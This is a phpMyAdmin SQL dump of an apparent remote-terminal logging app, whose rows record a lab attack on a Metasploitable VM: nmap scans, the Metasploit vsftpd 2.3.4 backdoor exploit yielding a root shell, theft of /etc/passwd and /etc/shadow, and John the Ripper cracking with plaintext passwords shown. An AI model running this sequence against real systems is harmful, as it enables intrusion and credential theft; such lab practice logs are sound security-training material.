-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jul 29, 2025 at 04:03 PM
-- Server version: 10.4.32-MariaDB
-- PHP Version: 8.2.12

SET FOREIGN_KEY_CHECKS=0;
SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `terminal_app`
--
CREATE DATABASE IF NOT EXISTS `terminal_app` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
USE `terminal_app`;

-- --------------------------------------------------------

--
-- Table structure for table `command_history`
--

CREATE TABLE `command_history` (
  `id` int(11) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `session_id` varchar(64) DEFAULT NULL,
  `is_interactive` tinyint(1) DEFAULT 0,
  `working_directory` text DEFAULT NULL,
  `command` text NOT NULL,
  `output` longtext DEFAULT NULL,
  `timestamp` timestamp NOT NULL DEFAULT current_timestamp(),
  `execution_start` timestamp NULL DEFAULT NULL,
  `response_timestamp` timestamp NULL DEFAULT NULL,
  `execution_time` decimal(10,6) DEFAULT NULL,
  `exit_code` int(11) DEFAULT NULL,
  `status` enum('pending','executing','completed','failed','timeout') DEFAULT 'pending',
  `context_data` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  `command_source` enum('terminal','interactive') DEFAULT 'terminal'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `command_history`
--

INSERT INTO `command_history` (`id`, `host_id`, `session_id`, `is_interactive`, `working_directory`, `command`, `output`, `timestamp`, `execution_start`, `response_timestamp`, `execution_time`, `exit_code`, `status`, `context_data`, `command_source`) VALUES
(1, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 0, '/home/kali', 'ip addr show', '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host noprefixroute \n       valid_lft forever preferred_lft forever\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 00:0c:29:cd:6a:0f brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.105/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0\n       valid_lft 26886sec preferred_lft 26886sec\n    inet6 fe80::cd93:d6bb:1629:8cb4/64 scope link noprefixroute \n       valid_lft forever preferred_lft forever\n', '2025-07-29 05:46:56', '2025-07-29 05:46:57', '2025-07-29 05:46:58', 0.004262, 0, 'completed', NULL, 'terminal'),
(2, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 0, '/home/kali', 'nmap -sP 192.168.1.1/24', 'Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 01:47 EDT\nNmap scan report for router.home.local (192.168.1.1)\nHost is up (0.00046s latency).\nMAC Address: E4:6C:D1:52:66:F1 (Calix)\nNmap scan report for decoMeshBE11000.home.local (192.168.1.103)\nHost is up (0.00090s latency).\nMAC Address: 74:FE:CE:82:C4:C1 (TP-Link PTE.)\nNmap scan report for 192.168.1.171\nHost is up (0.00020s latency).\nMAC Address: 00:0C:29:FA:34:FC (VMware)\nNmap scan report for 192.168.1.220\nHost is up (0.00017s latency).\nMAC Address: 00:0C:29:FA:DD:2A (VMware)\nNmap scan report for 192.168.1.233\nHost is up (0.0017s latency).\nMAC Address: 00:1F:29:0D:3F:FD (Hewlett Packard)\nNmap scan report for pfSense.home.local (192.168.1.242)\nHost is up (0.0013s latency).\nMAC Address: 00:0C:29:71:24:92 (VMware)\nNmap scan report for kali.home.local (192.168.1.105)\nHost is up.\nNmap done: 256 IP addresses (7 hosts up) scanned in 1.92 seconds\n', '2025-07-29 05:47:31', '2025-07-29 05:47:32', '2025-07-29 05:47:34', 1.979228, 0, 'completed', NULL, 'terminal'),
(3, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 0, '/home/kali', 'nmap -sS -sV -O 192.168.1.220', 'Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 01:48 EDT\nNmap scan report for 192.168.1.220\nHost is up (0.00027s latency).\nNot shown: 977 closed tcp ports (reset)\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n23/tcp   open  telnet      Linux telnetd\n25/tcp   open  smtp        Postfix smtpd\n53/tcp   open  domain      ISC BIND 9.4.2\n80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n111/tcp  open  rpcbind     2 (RPC #100000)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n512/tcp  open  exec        netkit-rsh rexecd\n513/tcp  open  login\n514/tcp  open  tcpwrapped\n1099/tcp open  java-rmi    GNU Classpath grmiregistry\n1524/tcp open  bindshell   Metasploitable root shell\n2049/tcp open  nfs         2-4 (RPC #100003)\n2121/tcp open  ftp         ProFTPD 1.3.1\n3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5\n5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7\n5900/tcp open  vnc         VNC (protocol 3.3)\n6000/tcp open  X11         (access denied)\n6667/tcp open  irc         UnrealIRCd\n8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)\n8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\nMAC Address: 00:0C:29:FA:DD:2A (VMware)\nDevice type: general purpose\nRunning: Linux 2.6.X\nOS CPE: cpe:/o:linux:linux_kernel:2.6\nOS details: Linux 2.6.9 - 2.6.33\nNetwork Distance: 1 hop\nService Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 13.01 seconds\n', '2025-07-29 05:48:11', '2025-07-29 05:48:13', '2025-07-29 05:48:28', 13.116213, 0, 'completed', NULL, 'terminal'),
(4, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 1, '/home/kali', 'msfconsole', 'Metasploit tip: Metasploit can be configured at startup, see msfconsole \r\n--help to learn more\r\n[*] Starting the Metasploit Framework console.../\r[*] Starting the Metasploit Framework console...-\r[*] Starting the Metasploit Framework console...\\\r[*] starting the Metasploit Framework console...|\r[*] STarting the Metasploit Framework console.../\r[*] StArting the Metasploit Framework console...-\r[*] StaRting the Metasploit Framework console...\\\r[*] StarTing the Metasploit Framework console...|\r[*] StartIng the Metasploit Framework console.../\r[*] StartiNg the Metasploit Framework console...-\r[*] StartinG the Metasploit Framework console...\\\r[*] Starting the Metasploit Framework console...|\r[*] Starting The Metasploit Framework console.../\r[*] Starting tHe Metasploit Framework console...-\r[*] Starting thE Metasploit Framework console...\\\r[*] Starting the Metasploit Framework console...|\r[*] Starting the metasploit Framework console.../\r[*] Starting the MEtasploit Framework console...-\r[*] Starting the MeTasploit Framework console...\\\r[*] Starting the MetAsploit Framework console...|\r[*] Starting the MetaSploit Framework console.../\r[*] Starting the MetasPloit Framework console...-\r[*] Starting the MetaspLoit Framework console...\\\r[*] Starting the MetasplOit Framework console...|\r[*] Starting the MetasploIt Framework console.../\r[*] Starting the MetasploiT Framework console...-\r[*] Starting the Metasploit Framework console...\\\r[*] Starting the Metasploit framework console...|\r[*] Starting the Metasploit FRamework console.../\r[*] Starting the Metasploit FrAmework console...-\r[*] Starting the Metasploit FraMework console...\\\r[*] Starting the Metasploit FramEwork console...|\r[*] Starting the Metasploit FrameWork console.../\r[*] Starting the Metasploit FramewOrk console...-\r[*] Starting the Metasploit FramewoRk console...\\\r[*] Starting the Metasploit FrameworK console...|\r[*] Starting the Metasploit Framework console.../\r[*] Starting the Metasploit Framework Console...-\r[*] Starting the Metasploit Framework cOnsole...\\\r[*] Starting the Metasploit Framework coNsole...|\r[*] Starting the Metasploit Framework conSole.../\r[*] Starting the Metasploit Framework consOle...-\r[*] Starting the Metasploit Framework consoLe...\\\r\r                                                  \r\nIIIIII    dTb.dTb        _.---._\r\n  II     4\'  v  \'B   .\'\"\".\'/|\\`.\"\"\'.\r\n  II     6.     .P  :  .\' / | \\ `.  :\r\n  II     \'T;. .;P\'  \'.\'  /  |  \\  `.\'\r\n  II      \'T; ;P\'    `. /   |   \\ .\'\r\nIIIIII     \'YvP\'       `-.__|__.-\'\r\n\r\nI love shells --egypt\r\n\r\n\r\n       =[ metasploit v6.4.69-dev                          ]\r\n+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]\r\n+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]\r\n+ -- --=[ 9 evasion                                       ]\r\n\r\nMetasploit Documentation: https://docs.metasploit.com/\r\n\r\nmsf6 > search vsftpd\r\r\n\r\nMatching Modules\r\n================\r\n\r\n   #  Name                                  Disclosure Date  Rank       Check  Description\r\n   -  ----                                  ---------------  ----       -----  -----------\r\n   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service\r\n   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\r\n\r\n\r\nInteract with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor\r\n\r\nmsf6 > use 1\r\r\n[*] No payload configured, defaulting to cmd/unix/interact\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options\r\r\n\r\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\r\n\r\n   Name     Current Setting  Required  Description\r\n   ----     ---------------  --------  -----------\r\n   CHOST                     no        The local client address\r\n   CPORT                     no        The local client port\r\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http\r\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT    21               yes       The target port (TCP)\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.220\r\r\nRHOSTS => 192.168.1.220\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\r\r\n[*] 192.168.1.220:21 - Banner: 220 (vsFTPd 2.3.4)\r\n[*] 192.168.1.220:21 - USER: 331 Please specify the password.\r\n[+] 192.168.1.220:21 - Backdoor service has been spawned, handling...\r\n[+] 192.168.1.220:21 - UID: uid=0(root) gid=0(root)\r\n[*] Found shell.\r\n[*] Command shell session 1 opened (192.168.1.105:37783 -> 192.168.1.220:6200) at 2025-07-29 01:51:06 -0400\r\n\r\ndownload /etc/passwd /home/kali/Desktop/files/passwd\r\n[*] Download /etc/passwd => /home/kali/Desktop/files/passwd\r\n[+] Done\r\ndownload /etc/shadow /home/kali/Desktop/files/shadow\r\n[*] Download /etc/shadow => /home/kali/Desktop/files/shadow\r\n[+] Done\r\nexit\r\n[*] 192.168.1.220 - Command shell session 1 closed.\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > exit\r\r\n\n[Interactive session ready - send commands or type \'exit\' to close]\n', '2025-07-29 05:48:48', '2025-07-29 05:48:49', '2025-07-29 05:52:25', 215.668754, 0, 'completed', NULL, 'terminal'),
(5, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 0, '/home/kali', 'unshadow /home/kali/Desktop/files/passwd /home/kali/Desktop/files/shadow > /home/kali/Desktop/files/pwds', '', '2025-07-29 05:52:49', '2025-07-29 05:52:50', '2025-07-29 05:52:50', 0.038477, 0, 'completed', NULL, 'terminal'),
(6, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 0, '/home/kali', 'john /home/kali/Desktop/files/pwds', 'Warning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"\nUse the \"--format=md5crypt-long\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 6 password hashes with 6 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nNo password hashes left to crack (see FAQ)\n', '2025-07-29 05:53:11', '2025-07-29 05:53:13', '2025-07-29 05:53:13', 0.149365, 0, 'completed', NULL, 'terminal'),
(7, 'kali-20d10699', 'sess_20250729_054649_0063b49b7bed841f', 0, '/home/kali', 'john --show /home/kali/Desktop/files/pwds', 'sys:batman:3:3:sys:/dev:/bin/sh\nklog:123456789:103:104::/home/klog:/bin/false\nmsfadmin:msfadmin:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\npostgres:postgres:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\nuser:user:1001:1001:just a user,111,,:/home/user:/bin/bash\nservice:service:1002:1002:,,,:/home/service:/bin/bash\n\n6 password hashes cracked, 0 left\n', '2025-07-29 05:53:27', '2025-07-29 05:53:27', '2025-07-29 05:53:27', 0.094544, 0, 'completed', NULL, 'terminal');

-- --------------------------------------------------------

--
-- Table structure for table `command_statistics`
--

CREATE TABLE `command_statistics` (
  `id` int(11) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `command_base` varchar(100) NOT NULL,
  `execution_count` int(11) DEFAULT 1,
  `avg_execution_time` decimal(10,6) DEFAULT NULL,
  `last_executed` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `success_rate` decimal(5,2) DEFAULT 100.00
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `command_statistics`
--

INSERT INTO `command_statistics` (`id`, `host_id`, `command_base`, `execution_count`, `avg_execution_time`, `last_executed`, `success_rate`) VALUES
(1, 'kali-20d10699', 'ip', 1, 0.004262, '2025-07-29 05:46:58', 100.00),
(2, 'kali-20d10699', 'nmap', 2, 7.547721, '2025-07-29 05:48:28', 100.00),
(4, 'kali-20d10699', 'msfconsole', 1, 215.668754, '2025-07-29 05:52:25', 100.00),
(5, 'kali-20d10699', 'unshadow', 1, 0.038477, '2025-07-29 05:52:50', 100.00),
(6, 'kali-20d10699', 'john', 2, 0.121955, '2025-07-29 05:53:27', 100.00);

-- --------------------------------------------------------

--
-- Table structure for table `hosts`
--

CREATE TABLE `hosts` (
  `id` int(11) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `hostname` varchar(255) NOT NULL,
  `ip_address` varchar(45) NOT NULL,
  `os_info` text DEFAULT NULL,
  `last_seen` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `connected` tinyint(1) DEFAULT 1,
  `first_seen` timestamp NOT NULL DEFAULT current_timestamp(),
  `total_sessions` int(11) DEFAULT 0,
  `total_commands` int(11) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `hosts`
--

INSERT INTO `hosts` (`id`, `host_id`, `hostname`, `ip_address`, `os_info`, `last_seen`, `connected`, `first_seen`, `total_sessions`, `total_commands`) VALUES
(1, 'kali-20d10699', 'kali', '192.168.1.105', 'Kali GNU/Linux Rolling', '2025-07-29 14:03:25', 1, '2025-07-29 05:46:21', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `host_instance_mappings`
--

CREATE TABLE `host_instance_mappings` (
  `id` int(11) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `instance_token` varchar(128) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `mapped_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `expires_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `is_active` tinyint(1) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `host_instance_mappings`
--

INSERT INTO `host_instance_mappings` (`id`, `host_id`, `instance_token`, `user_id`, `mapped_at`, `expires_at`, `is_active`) VALUES
(1, 'kali-20d10699', 'inst_14_1753767962_ada4c8c06a41b5eb67d1adb7ea83a828', 14, '2025-07-29 14:03:25', '2025-07-29 13:46:21', 1);

-- --------------------------------------------------------

--
-- Table structure for table `interactive_command_patterns`
--

CREATE TABLE `interactive_command_patterns` (
  `id` int(11) NOT NULL,
  `command_pattern` varchar(255) NOT NULL,
  `pattern_type` enum('exact','prefix','regex','contains') DEFAULT 'exact',
  `is_interactive` tinyint(1) DEFAULT 1,
  `is_continuous` tinyint(1) DEFAULT 0,
  `timeout_seconds` int(11) DEFAULT 1800,
  `description` text DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  `is_active` tinyint(1) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `interactive_command_patterns`
--

INSERT INTO `interactive_command_patterns` (`id`, `command_pattern`, `pattern_type`, `is_interactive`, `is_continuous`, `timeout_seconds`, `description`, `created_at`, `is_active`) VALUES
(1, 'msfconsole', 'exact', 1, 0, 1800, 'Metasploit', '2025-07-07 23:54:06', 1),
(2, 'ssh', 'prefix', 1, 0, 1800, 'SSH remote access', '2025-07-07 23:54:06', 1),
(3, 'python', 'exact', 1, 0, 1800, 'Python interpreter', '2025-07-07 23:54:06', 1),
(4, 'python3', 'exact', 1, 0, 1800, 'Python 3 interpreter', '2025-07-07 23:54:06', 1),
(5, 'mysql', 'prefix', 1, 0, 1800, 'MySQL client', '2025-07-07 23:54:06', 1),
(6, 'vim', 'prefix', 1, 0, 1800, 'Vim editor', '2025-07-07 23:54:06', 1),
(7, 'nano', 'prefix', 1, 0, 1800, 'Nano editor', '2025-07-07 23:54:06', 1),
(8, 'top', 'exact', 1, 0, 1800, 'System monitor', '2025-07-07 23:54:06', 1),
(9, 'ping', 'prefix', 1, 0, 1800, 'Network ping', '2025-07-07 23:54:06', 1),
(10, 'telnet', 'exact', 1, 0, 1800, 'Telnet client - exact match', '2025-07-08 00:24:32', 1),
(11, 'telnet ', 'prefix', 1, 0, 1800, 'Telnet client with arguments', '2025-07-08 00:24:32', 1);

-- --------------------------------------------------------

--
-- Table structure for table `shell_sessions`
--

CREATE TABLE `shell_sessions` (
  `id` int(11) NOT NULL,
  `session_id` varchar(64) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `current_directory` text DEFAULT NULL,
  `initial_directory` text DEFAULT NULL,
  `environment_vars` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_bin DEFAULT NULL,
  `start_time` timestamp NOT NULL DEFAULT current_timestamp(),
  `last_activity` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `is_active` tinyint(1) DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `streaming_output`
--

CREATE TABLE `streaming_output` (
  `id` int(11) NOT NULL,
  `command_id` int(11) NOT NULL,
  `session_id` varchar(64) NOT NULL,
  `output_chunk` longtext NOT NULL,
  `chunk_sequence` int(11) DEFAULT 1,
  `is_partial` tinyint(1) DEFAULT 1,
  `timestamp` timestamp NOT NULL DEFAULT current_timestamp(),
  `last_update` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `streaming_output`
--

INSERT INTO `streaming_output` (`id`, `command_id`, `session_id`, `output_chunk`, `chunk_sequence`, `is_partial`, `timestamp`, `last_update`) VALUES
(1, 4, 'sess_20250729_054649_0063b49b7bed841f', 'Metasploit tip: Metasploit can be configured at startup, see msfconsole \r\n--help to learn more\r\n[*] Starting the Metasploit Framework console.../\r[*] Starting the Metasploit Framework console...-\r[*] Starting the Metasploit Framework console...\\\r[*] starting the Metasploit Framework console...|\r[*] STarting the Metasploit Framework console.../\r[*] StArting the Metasploit Framework console...-\r[*] StaRting the Metasploit Framework console...\\\r[*] StarTing the Metasploit Framework console...|\r[*] StartIng the Metasploit Framework console.../\r', 1, 1, '2025-07-29 05:48:49', '2025-07-29 05:48:52'),
(3, 4, 'sess_20250729_054649_0063b49b7bed841f', '[*] StartiNg the Metasploit Framework console...-\r[*] StartinG the Metasploit Framework console...\\\r[*] Starting the Metasploit Framework console...|\r[*] Starting The Metasploit Framework console.../\r[*] Starting tHe Metasploit Framework console...-\r[*] Starting thE Metasploit Framework console...\\\r[*] Starting the Metasploit Framework console...|\r[*] Starting the metasploit Framework console.../\r[*] Starting the MEtasploit Framework console...-\r[*] Starting the MeTasploit Framework console...\\\r[*] Starting the MetAsploit Framework console...|\r[*] Starting the MetaSploit Framework console.../\r[*] Starting the MetasPloit Framework console...-\r[*] Starting the MetaspLoit Framework console...\\\r[*] Starting the MetasplOit Framework console...|\r[*] Starting the MetasploIt Framework console.../\r[*] Starting the MetasploiT Framework console...-\r[*] Starting the Metasploit Framework console...\\\r[*] Starting the Metasploit framework console...|\r[*] Starting the Metasploit FRamework console.../\r', 2, 1, '2025-07-29 05:48:55', '2025-07-29 05:48:55'),
(4, 4, 'sess_20250729_054649_0063b49b7bed841f', '[*] Starting the Metasploit FrAmework console...-\r[*] Starting the Metasploit FraMework console...\\\r[*] Starting the Metasploit FramEwork console...|\r[*] Starting the Metasploit FrameWork console.../\r[*] Starting the Metasploit FramewOrk console...-\r[*] Starting the Metasploit FramewoRk console...\\\r[*] Starting the Metasploit FrameworK console...|\r[*] Starting the Metasploit Framework console.../\r[*] Starting the Metasploit Framework Console...-\r[*] Starting the Metasploit Framework cOnsole...\\\r[*] Starting the Metasploit Framework coNsole...|\r[*] Starting the Metasploit Framework conSole.../\r[*] Starting the Metasploit Framework consOle...-\r[*] Starting the Metasploit Framework consoLe...\\\r\r                                                  \r\nIIIIII    dTb.dTb        _.---._\r\n  II     4\'  v  \'B   .\'\"\".\'/|\\`.\"\"\'.\r\n  II     6.     .P  :  .\' / | \\ `.  :\r\n  II     \'T;. .;P\'  \'.\'  /  |  \\  `.\'\r\n  II      \'T; ;P\'    `. /   |   \\ .\'\r\nIIIIII     \'YvP\'       `-.__|__.-\'\r\n\r\nI love shells --egypt\r\n\r\n\r\n       =[ metasploit v6.4.69-dev                          ]\r\n+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]\r\n+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]\r\n+ -- --=[ 9 evasion                                       ]\r\n\r\nMetasploit Documentation: https://docs.metasploit.com/\r\n\r\n', 3, 1, '2025-07-29 05:48:57', '2025-07-29 05:48:57'),
(5, 4, 'sess_20250729_054649_0063b49b7bed841f', '\n[Interactive session ready - send commands or type \'exit\' to close]\n', 9999, 1, '2025-07-29 05:49:09', '2025-07-29 05:49:09'),
(6, 4, 'sess_20250729_054649_0063b49b7bed841f', 'msf6 > ', 4, 1, '2025-07-29 05:49:12', '2025-07-29 05:49:12'),
(7, 4, 'sess_20250729_054649_0063b49b7bed841f', 'search vsftpd\r\r\n\r\nMatching Modules\r\n================\r\n\r\n   #  Name                                  Disclosure Date  Rank       Check  Description\r\n   -  ----                                  ---------------  ----       -----  -----------\r\n   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service\r\n   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\r\n\r\n\r\nInteract with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor\r\n\r\nmsf6 > ', 5, 1, '2025-07-29 05:49:39', '2025-07-29 05:49:39'),
(8, 4, 'sess_20250729_054649_0063b49b7bed841f', 'use 1\r\r\n[*] No payload configured, defaulting to cmd/unix/interact\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > ', 6, 1, '2025-07-29 05:49:55', '2025-07-29 05:49:55'),
(9, 4, 'sess_20250729_054649_0063b49b7bed841f', 'show options\r\r\n\r\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\r\n\r\n   Name     Current Setting  Required  Description\r\n   ----     ---------------  --------  -----------\r\n   CHOST                     no        The local client address\r\n   CPORT                     no        The local client port\r\n   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http\r\n   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\r\n   RPORT    21               yes       The target port (TCP)\r\n\r\n\r\nExploit target:\r\n\r\n   Id  Name\r\n   --  ----\r\n   0   Automatic\r\n\r\n\r\n\r\nView the full module info with the info, or info -d command.\r\n\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > ', 7, 1, '2025-07-29 05:50:25', '2025-07-29 05:50:25'),
(10, 4, 'sess_20250729_054649_0063b49b7bed841f', 'set RHOSTS 192.168.1.220\r\r\nRHOSTS => 192.168.1.220\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > ', 8, 1, '2025-07-29 05:50:50', '2025-07-29 05:50:50'),
(11, 4, 'sess_20250729_054649_0063b49b7bed841f', 'exploit\r\r\n[*] 192.168.1.220:21 - Banner: 220 (vsFTPd 2.3.4)\r\n[*] 192.168.1.220:21 - USER: 331 Please specify the password.\r\n[+] 192.168.1.220:21 - Backdoor service has been spawned, handling...\r\n[+] 192.168.1.220:21 - UID: uid=0(root) gid=0(root)\r\n', 9, 1, '2025-07-29 05:50:59', '2025-07-29 05:50:59'),
(12, 4, 'sess_20250729_054649_0063b49b7bed841f', '[*] Found shell.\r\n', 10, 1, '2025-07-29 05:51:02', '2025-07-29 05:51:02'),
(13, 4, 'sess_20250729_054649_0063b49b7bed841f', '[*] Command shell session 1 opened (192.168.1.105:37783 -> 192.168.1.220:6200) at 2025-07-29 01:51:06 -0400\r\n\r\n', 11, 1, '2025-07-29 05:51:09', '2025-07-29 05:51:09'),
(14, 4, 'sess_20250729_054649_0063b49b7bed841f', 'download /etc/passwd /home/kali/Desktop/files/passwd\r\n[*] Download /etc/passwd => /home/kali/Desktop/files/passwd\r\n[+] Done\r\n', 12, 1, '2025-07-29 05:51:41', '2025-07-29 05:51:41'),
(15, 4, 'sess_20250729_054649_0063b49b7bed841f', 'download /etc/shadow /home/kali/Desktop/files/shadow\r\n[*] Download /etc/shadow => /home/kali/Desktop/files/shadow\r\n[+] Done\r\n', 13, 1, '2025-07-29 05:51:51', '2025-07-29 05:51:51'),
(16, 4, 'sess_20250729_054649_0063b49b7bed841f', 'exit\r\n[*] 192.168.1.220 - Command shell session 1 closed.\r\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > ', 14, 1, '2025-07-29 05:52:17', '2025-07-29 05:52:17'),
(17, 4, 'sess_20250729_054649_0063b49b7bed841f', 'exit\r\r\n', 15, 1, '2025-07-29 05:52:24', '2025-07-29 05:52:24');

-- --------------------------------------------------------

--
-- Table structure for table `streaming_sessions`
--

CREATE TABLE `streaming_sessions` (
  `id` int(11) NOT NULL,
  `command_id` int(11) NOT NULL,
  `session_id` varchar(64) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `status` enum('active','paused','completed','terminated') DEFAULT 'active',
  `start_time` timestamp NOT NULL DEFAULT current_timestamp(),
  `end_time` timestamp NULL DEFAULT NULL,
  `last_activity` timestamp NOT NULL DEFAULT current_timestamp() ON UPDATE current_timestamp(),
  `total_input_lines` int(11) DEFAULT 0,
  `total_output_size` bigint(20) DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `streaming_sessions`
--

INSERT INTO `streaming_sessions` (`id`, `command_id`, `session_id`, `host_id`, `status`, `start_time`, `end_time`, `last_activity`, `total_input_lines`, `total_output_size`) VALUES
(1, 4, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 'completed', '2025-07-29 05:48:48', '2025-07-29 05:52:25', '2025-07-29 05:52:25', 9, 5369);

-- --------------------------------------------------------

--
-- Table structure for table `user_input_queue`
--

CREATE TABLE `user_input_queue` (
  `id` int(11) NOT NULL,
  `session_id` varchar(64) NOT NULL,
  `host_id` varchar(50) NOT NULL,
  `user_id` int(11) DEFAULT NULL,
  `command_id` int(11) DEFAULT NULL,
  `input_data` text NOT NULL,
  `input_type` enum('command','response','ctrl_signal') DEFAULT 'response',
  `timestamp` timestamp NOT NULL DEFAULT current_timestamp(),
  `processed` tinyint(1) DEFAULT 0,
  `processed_at` timestamp NULL DEFAULT NULL,
  `priority` tinyint(4) DEFAULT 5
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `user_input_queue`
--

INSERT INTO `user_input_queue` (`id`, `session_id`, `host_id`, `user_id`, `command_id`, `input_data`, `input_type`, `timestamp`, `processed`, `processed_at`, `priority`) VALUES
